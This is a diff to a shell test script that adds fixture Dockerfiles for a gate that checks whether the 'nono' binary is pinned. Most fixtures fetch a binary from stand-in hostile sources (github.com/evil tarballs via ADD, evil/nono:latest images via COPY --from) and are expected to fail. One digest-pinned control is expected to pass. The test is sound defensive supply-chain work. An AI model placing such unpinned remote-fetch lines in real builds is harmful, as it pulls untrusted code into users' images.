@@ -147,6 +147,73 @@ EOF
 } >"$d/docker/Dockerfile"
 run_case "canonical-default-branch" fail "$d"
 
+# ── 8. Remote ADD in a second stage, consumed by COPY --from (Kern C) ────────
+d="$(mk remote-add-url)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM rust:bookworm AS nono-extra
+ADD https://github.com/evil/nono/releases/latest/download/nono-linux.tar.gz /tmp/n
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-extra /tmp/n /usr/local/bin/nono
+EOF
+} >"$d/docker/Dockerfile"
+run_case "remote-add-url" fail "$d"
+
+# ── 9. COPY --from a moving image ref (no clone, no scheme, no keyword) ──────
+d="$(mk image-ref-copy)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=evil/nono:latest /usr/local/bin/nono /usr/local/bin/nono
+EOF
+} >"$d/docker/Dockerfile"
+run_case "image-ref-copy" fail "$d"
+
+# ── 10. A moving image stage consumed by name (Sherlock B) ───────────────────
+d="$(mk image-ref-stage)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM ghcr.io/evil/nono:latest AS nono-extra
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-extra /usr/local/bin/nono /usr/local/bin/nono
+EOF
+} >"$d/docker/Dockerfile"
+run_case "image-ref-stage" fail "$d"
+
+# ── 11. ADD a tarball on a non-main ref (no keyword for the word-scan) ───────
+d="$(mk add-nonmain-tarball)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+ADD https://codeload.github.com/evil/nono/tar.gz/stable-x /tmp/n.tgz
+EOF
+} >"$d/docker/Dockerfile"
+run_case "add-nonmain-tarball" fail "$d"
+
+# ── 12. ADD a canonical-host tarball at a pinned-looking path (Sherlock D) ───
+d="$(mk add-pinned-looking-tarball)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+ADD https://codeload.github.com/evil/nono/tar.gz/1111111111111111111111111111111111111111 /tmp/n.tgz
+EOF
+} >"$d/docker/Dockerfile"
+run_case "add-pinned-looking-tarball" fail "$d"
+
+# ── 13. Positive: digest-pinned bases + COPY --from=nono-builder must pass ───
+# Proves rule 6 is not "reject all COPY --from / all images".
+d="$(mk digest-pinned-control)"; good_pin "$d"
+cat >"$d/docker/Dockerfile" <<'EOF'
+FROM rust:bookworm@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa AS nono-builder
+COPY .nono-version /tmp/.nono-version
+RUN set -eux; \
+    . /tmp/.nono-version; \
+    git clone --filter=blob:none https://github.com/nolabs-ai/nono /tmp/nono; \
+    git -C /tmp/nono checkout "${commit}"; \
+    test "$(git -C /tmp/nono rev-parse HEAD)" = "${commit}"; \
+    cd /tmp/nono; \
+    cargo build --release -p nono-cli; \
+    cp target/release/nono /usr/local/bin/nono
+FROM node:24-bookworm-slim@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+EOF
+run_case "digest-pinned-control" pass "$d"
+
 # ── Regression guard: the CI workflow must still invoke the gate ─────────────
 if grep -qF './scripts/check-nono-pin.sh' "$repo_root/.github/workflows/test.yml"; then
   printf 'PASS  %-26s test.yml invokes check-nono-pin.sh\n' "workflow-invokes-gate"; npass=$((npass + 1))
